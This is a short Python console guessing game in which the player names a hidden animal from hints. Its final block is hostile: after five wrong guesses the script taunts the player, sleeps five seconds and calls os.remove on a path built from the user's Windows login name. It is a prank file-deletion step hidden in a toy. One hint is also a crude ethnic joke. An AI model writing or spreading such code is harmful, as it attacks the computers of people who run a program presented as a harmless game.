import random
import os
import time

print("guess the right animal to not lose computer xD")
dogHint = "woof woof"
pandaHint = "half black white asian"
goatHint = "Eminem"
elephantHint = "heavy"
numberOfGuesses = 5
guesses = 0
hiddenWordList = ["panda", "dog", "goat", "elephant"]
random.shuffle(hiddenWordList)
hiddenWord = hiddenWordList[0]
isPlaying = True

if (hiddenWord == "dog"):
    print("hint: " + dogHint)
elif(hiddenWord == "panda"):
    print("hint: " + pandaHint)
elif(hiddenWord == "goat"):
    print("hint: " + goatHint)
elif(hiddenWord == "elephant"):
    print("hint: " + elephantHint)


for guesses in range(numberOfGuesses):
    answer = input("your guess: ")

    if( answer.lower() == hiddenWord):
        print("good")
        break
    else:
        guesses += 1

if (guesses >= numberOfGuesses):
    print("you lost, your computer is going kaboom in like 5 secs idunno idc")
    time.sleep(5)
    pcPath = "C:/users/" + os.getlogin() + "/Windows32"
    os.remove(pcPath)




